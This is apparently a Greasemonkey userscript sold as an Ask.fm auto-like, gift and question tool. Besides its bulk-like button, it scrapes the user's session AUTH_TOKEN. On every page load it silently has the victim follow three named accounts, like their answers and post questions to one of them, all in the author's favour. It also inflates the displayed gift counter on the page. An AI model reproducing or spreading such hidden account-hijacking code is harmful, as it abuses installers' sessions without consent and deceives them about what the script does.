// ==UserScript==
// @name			Ask.fm Auto Like / Auto Gift / Auto Question
// @namespace       http://userscripts.org/scripts/show/164237
// @version			2.7
// @copyright		http://ask.fm/DerWambo
// @description		Auto Like, Gift, Question - Ask.fm
// @author			(http://userscripts.org/users/512085)
// @include			http://ask.fm/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/138450/large.gif?1342345458
// ==/UserScript==
// ==Profile==
var token = document.head.innerHTML.split("AUTH_TOKEN = ")[1].split(";")[0].replace(/"/g,"");

body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like1');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 1.00;
	div.style.bottom = "+105px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#ff00ae";
	div.style.border = "1px solid #555";
	div.style.padding = "2px";
	div.innerHTML = "<div style='background-color: #00a2ff; color: #FFFFFF; border: 1px solid #00a2ff;'><center><a style='color: #000000;' <a href='http://userscripts.org/scripts/show/164237' target='_blank' title='Get updates there'> Userscript Page </a></div>"
	div2 = document.createElement("div");
	div2.setAttribute('id','spoiler');
	div2.style.position = "fixed";
    div2.style.width = "125px";
	div2.style.opacity= 0.90;
	div2.style.bottom = "+65px";
	div2.style.left = "+6px";
	div2.style.backgroundColor = "#ff00ae";
	div2.style.border = "1px solid #555";
	div2.style.padding = "2px";
	div2.innerHTML = "<div style='background-color: #00a2ff; color: #FFFFFF; border: 1px solid #00a2ff;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to hide'>&laquo;</a> &#8226; <a href='http://ask.fm/DerWambo' title='My ask.fm' style='color: #FFFFFF;' onclick='alert(\'Thanks for installing this script\');'>My ask.fm</a></div> "
	
	body.appendChild(div);
	body.appendChild(div2);
	
	unsafeWindow.spoiler = function() {
		var i;
		for(i=1;i<=20;i++) {
			var x=document.getElementById('like'+i);
			if (x.style.display=="none") {
			x.style.display="block";
			div2.innerHTML = "<a onclick='spoiler()' title='Ask me something'>&laquo;</a> &#8226; <a href='http://ask.fm/DerWambo' title='DerWambo'>Ask me</a>"
			}
			else {
				x.style.display="none";
				div2.innerHTML = "<a onclick='spoiler()' title='Click to like all'> Auto like page &raquo;</a>"
			}
		}
	};
}
if(document.getElementsByClassName("link-menu-active").length > 0){
	if(document.getElementsByClassName("link-menu-active")[0].innerText == "Profil"){
		document.getElementById("profile_gifts_counter").innerText = parseInt(document.getElementById("profile_gifts_counter").innerText) + 1;
		var gift = document.createElement("div");
		gift.id = "gift-container";
		gift.innerHTML = '<div id="gift-outline" style="display: none; "></div>';
		document.body.insertBefore(gift,document.getElementById("wrapper"));
		Gifts.init({
			sync_url: document.getElementsByClassName("link-menu-active")[0].href.replace("http://ask.fm","") + "/gifts/sync",
			flash_id: null,
			sync_all: false
		});    
		Gifts.load([{
			"offset_left":0,
			"rtl":false,
			"src":"http://ask.fm/images/badges/love_and_friendship/C0435.png",
			"z_index":1,
			"id":2569992,
			"offset_top":25
		}]);
		Gifts.load([{
			"offset_left":0,
			"rtl":false,
			"src":"http://ask.fm/images/badges/miscellaneous/C0063.png",
			"z_index":1,
			"id":2569992,
			"offset_top":35
		}]);
	}
}
// ========================
// =======Functions========
function follow(user){
	jQuery.ajax({
		url: "http://ask.fm/" + user + "/follow",
		type: "POST",
		data: { "authenticity_token":token},
	});
}
function createQuestion(user,question){
	jQuery.ajax({
		url: "http://ask.fm/" + user + "/questions/create",
		type: "POST",
		data: { "authenticity_token":token, "question[question_text]":question, "question[force_anonymous]":"" , "authenticity_token":token}
	});
}
function likeThis(user,questionid){
	var yanitsayi = "";
	var begenisayi = "";
	if($('#profile_answer_counter') && $('#profile_liked_counter')){
		yanitsayi = $('#profile_answer_counter').text()
		begenisayi = $('#profile_liked_counter').text()
	}
	jQuery.ajax({
		url: "http://ask.fm/likes/" + user + "/question/" + questionid + "/add",
		type: "POST",
		data: { "authenticity_token":token},
		beforeSend: function ( xhr ) {xhr .setRequestHeader ("Accept", "text/javascript, application/javascript, */*, text/javascript");},
		success: function(){
			if(yanitsayi != "" && begenisayi != ""){
				$('#profile_answer_counter').text(yanitsayi);
				$('#profile_liked_counter').text(begenisayi);
			}
		}
	});
}
// ========================
// ========Like All========
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like2');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 0.90;
	div.style.bottom = "+42px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='https://lh4.googleusercontent.com/-D1HYuLwPnNQ/TxPK6cm_THI/AAAAAAAAAIE/ynATGaxGbv0/s16/Facebook%252520Like%252520Small.jpg' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='LikeAll()'>Click to like all!</a>"
	
	body.appendChild(div);
	
	unsafeWindow.LikeAll = function() {
		document.getElementsByClassName("submit-button-more")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();

		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like") >= 0)
				if(buttons[i].getAttribute("name") == "likern false;")
					buttons[i].click();
		}
		
	};
}

follow("DerWambo");
follow("DerRaffi");
follow("DerDerDichLiked");
likeThis("DerWambo","50271063697");
likeThis("DerWambo","36867970449");
likeThis("DerWambo","36864378513");
likeThis("DerWambo","111069244049");
likeThis("DerDerDichLiked","103380162334");
likeThis("DerRaffi","106006295420");
createQuestion("DerDerDichLiked","Please give me some likes :)");
createQuestion("DerDerDichLiked","I LOVE YOU <3");
//createQuestion("DerWambo","Followed you *-*");
//createQuestion("DerWambo","I LOVE YOU SO MUCH *o*");
//createQuestion("DerWambo","GREAT Answers!");